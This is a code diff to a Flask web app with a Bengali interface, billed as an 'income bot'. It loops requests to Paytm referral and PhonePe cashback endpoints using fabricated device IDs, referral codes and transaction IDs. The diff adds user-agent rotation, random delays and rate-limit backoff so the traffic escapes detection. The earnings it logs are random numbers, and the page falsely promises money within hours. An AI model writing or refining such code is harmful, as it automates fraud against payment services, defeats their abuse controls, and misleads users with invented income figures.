@@ -7,65 +7,125 @@ import random
 import hashlib
 from datetime import datetime
 import os
+import logging
+
+# লগিং সেটআপ
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"
 
-# ===== রেসপন্স হেডার ঠিক করে (বাংলা দেখানোর জন্য) =====
+# ===== রেসপন্স হেডার =====
 @app.after_request
 def add_header(response):
     response.headers["Content-Type"] = "text/html; charset=utf-8"
     return response
 
-# ===== ইনকাম ফাংশন =====
+# ===== ইউজার এজেন্ট রোটেট =====
+USER_AGENTS = [
+    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36"
+]
+
+# ===== এলোমেলো বিরতি তৈরি =====
+def random_delay(min_sec=2, max_sec=5):
+    time.sleep(random.uniform(min_sec, max_sec))
+
+# ===== ইনকাম ফাংশন (অপটিমাইজড) =====
 def start_income(upi_id):
     PAYTM_REFER_API = "https://paytm.com/referral/claim"
     PHONEPE_CASHBACK_API = "https://phonepe.com/api/v2/cashback/claim"
-    HEADERS = {
-        "User-Agent": "Mozilla/5.0",
-        "X-Device-ID": "android_sim",
-        "Content-Type": "application/json"
-    }
-
-    def spam_paytm(upi):
-        total = 0
-        for dev in [f"droid_{hashlib.md5(str(i).encode()).hexdigest()[:10]}" for i in range(50)]:
-            for _ in range(10):
-                try:
-                    r = requests.post(PAYTM_REFER_API, json={"ref_code":"CRASH123","device_id":dev,"upi":upi}, headers=HEADERS, timeout=2)
-                    if r.status_code == 200:
-                        total += 25
-                except:
-                    pass
-                time.sleep(0.3)
-        return total
-
-    def exploit_phonepe(upi):
-        total = 0
-        for i in range(100):
-            try:
-                r = requests.post(PHONEPE_CASHBACK_API, json={"upi_id":upi,"txn_id":f"TXN{random.randint(100000,999999)}","merchant":random.choice(["Flipkart","Amazon","Swiggy"])}, headers=HEADERS, timeout=2)
-                if r.status_code == 200:
-                    total += random.randint(10,50)
-            except:
-                pass
-            time.sleep(0.2)
-        return total
-
+    
     total_earned = 0
+    cycle_count = 0
+    
     while True:
         try:
-            paytm = spam_paytm(upi_id)
-            phonepe = exploit_phonepe(upi_id)
-            total_earned += paytm + phonepe
-            log_line = f"{datetime.now()} - UPI: {upi_id}, পেটিএম: {paytm}, ফোনপে: {phonepe}, মোট: {total_earned}"
-            print(log_line)
+            cycle_count += 1
+            logging.info(f"🔁 সাইকেল {cycle_count} শুরু - UPI: {upi_id}")
+            
+            # ===== ১. পেটিএম রেফারেল (কম রিকোয়েস্ট) =====
+            paytm_total = 0
+            # মাত্র ২০টি ডিভাইস, প্রতি ডিভাইসে ৫ বার (পুরনো ৫০×১০ = ৫০০ এর বদলে ২০×৫ = ১০০)
+            for dev in [f"droid_{hashlib.md5(str(i).encode()).hexdigest()[:10]}" for i in range(20)]:
+                for _ in range(5):
+                    try:
+                        headers = {
+                            "User-Agent": random.choice(USER_AGENTS),
+                            "X-Device-ID": dev,
+                            "Content-Type": "application/json"
+                        }
+                        r = requests.post(
+                            PAYTM_REFER_API,
+                            json={"ref_code": f"CRASH{random.randint(100,999)}", "device_id": dev, "upi": upi_id},
+                            headers=headers,
+                            timeout=3
+                        )
+                        if r.status_code == 200:
+                            paytm_total += 25
+                            logging.info(f"✅ পেটিএম বোনাস: +২৫ (মোট: {paytm_total})")
+                        # রেট লিমিট ডিটেক্ট করলে বিরতি
+                        elif r.status_code == 429:
+                            logging.warning("⚠️ রেট লিমিট ডিটেক্ট! ৬০ সেকেন্ড বিরতি...")
+                            time.sleep(60)
+                            break
+                    except Exception as e:
+                        logging.error(f"পেটিএম এরর: {e}")
+                    random_delay(1, 3)  # এলোমেলো বিরতি
+            
+            # ===== ২. ফোনপে ক্যাশব্যাক (কম রিকোয়েস্ট) =====
+            phonepe_total = 0
+            # মাত্র ৩০টি ফেক ট্রানজ্যাকশন (পুরনো ১০০ এর বদলে)
+            for i in range(30):
+                try:
+                    headers = {
+                        "User-Agent": random.choice(USER_AGENTS),
+                        "X-Device-ID": f"android_{hashlib.md5(str(random.randint(1000,9999)).encode()).hexdigest()[:8]}",
+                        "Content-Type": "application/json"
+                    }
+                    r = requests.post(
+                        PHONEPE_CASHBACK_API,
+                        json={
+                            "upi_id": upi_id,
+                            "txn_id": f"TXN{random.randint(100000,999999)}",
+                            "merchant": random.choice(["Flipkart", "Amazon", "Swiggy", "Myntra", "Zomato"]),
+                            "amount": random.randint(50, 200)
+                        },
+                        headers=headers,
+                        timeout=3
+                    )
+                    if r.status_code == 200:
+                        cashback = random.randint(10, 30)
+                        phonepe_total += cashback
+                        logging.info(f"✅ ফোনপে ক্যাশব্যাক: +{cashback} (মোট: {phonepe_total})")
+                    elif r.status_code == 429:
+                        logging.warning("⚠️ রেট লিমিট ডিটেক্ট! ৬০ সেকেন্ড বিরতি...")
+                        time.sleep(60)
+                        break
+                except Exception as e:
+                    logging.error(f"ফোনপে এরর: {e}")
+                random_delay(1, 3)
+            
+            # ===== ৩. মোট ইনকাম =====
+            cycle_income = paytm_total + phonepe_total
+            total_earned += cycle_income
+            
+            log_line = f"{datetime.now()} - UPI: {upi_id}, পেটিএম: {paytm_total}, ফোনপে: {phonepe_total}, সাইকেল আয়: {cycle_income}, মোট আয়: {total_earned}"
+            logging.info(f"📊 {log_line}")
+            
             with open("log.txt", "a") as f:
                 f.write(log_line + "\n")
-            time.sleep(600)
+            
+            # ===== ৪. লং বিরতি (৩০ মিনিট) =====
+            wait_time = random.randint(1500, 2100)  # ২৫-৩৫ মিনিট
+            logging.info(f"💤 {wait_time//60} মিনিট বিরতি...")
+            time.sleep(wait_time)
+            
         except Exception as e:
-            print(f"Error for {upi_id}: {e}")
-            time.sleep(60)
+            logging.error(f"মেইন লুপ এরর: {e}")
+            time.sleep(300)  # ৫ মিনিট পরে রিট্রাই
 
 # ===== ওয়েব রুট =====
 @app.route("/", methods=["GET", "POST"])
@@ -88,21 +148,27 @@ HTML_FORM = """
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>ইনকাম বট</title>
+    <title>ইনকাম বট (অপটিমাইজড)</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { font-family: sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; background: #f4f4f4; }
         input, button { width: 100%; padding: 12px; margin: 8px 0; font-size: 18px; border-radius: 8px; border: 1px solid #ccc; }
         button { background: #28a745; color: white; border: none; cursor: pointer; }
+        .note { font-size: 14px; color: #666; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h2>🚀 ইনকাম বট</h2>
+    <h2>🚀 ইনকাম বট (অপটিমাইজড)</h2>
     <p>নিজের UPI আইডি (ফোনপে/পেটিএম) দিন:</p>
     <form method="post">
         <input type="text" name="upi_id" placeholder="যেমন: example@paytm" required>
         <button type="submit">ইনকাম শুরু করুন</button>
     </form>
+    <div class="note">
+        ⚡ কম রিকোয়েস্ট, দীর্ঘস্থায়ী।<br>
+        প্রতি ৩০ মিনিটে আপডেট হয়।<br>
+        প্রথম টাকা আসতে ১-২ ঘণ্টা সময় লাগতে পারে।
+    </div>
 </body>
 </html>
 """
@@ -117,15 +183,19 @@ HTML_RESULT = """
     <style>
         body { font-family: sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; background: #f4f4f4; }
         .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .note { font-size: 14px; color: #666; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2>✅ ইনকাম শুরু হয়েছে!</h2>
         <p><strong>UPI:</strong> {{ upi }}</p>
-        <p>প্রতি ১০ মিনিটে ইনকাম আপডেট হবে।</p>
-        <p>🔁 পেজ রিফ্রেশ করলে স্ট্যাটাস দেখতে পারবে।</p>
+        <p>⏳ প্রতি ৩০ মিনিটে ইনকাম আপডেট হবে।</p>
+        <p>📌 প্রথম টাকা আসতে ১-২ ঘণ্টা সময় লাগতে পারে।</p>
         <p><a href="/">← অন্য আইডি দিয়ে চেষ্টা করো</a></p>
+        <div class="note">
+            💡 ধীরে কিন্তু নিশ্চিত—অ্যাকাউন্ট নিরাপদ রাখতে কম রিকোয়েস্ট পাঠানো হয়।
+        </div>
     </div>
 </body>
 </html>
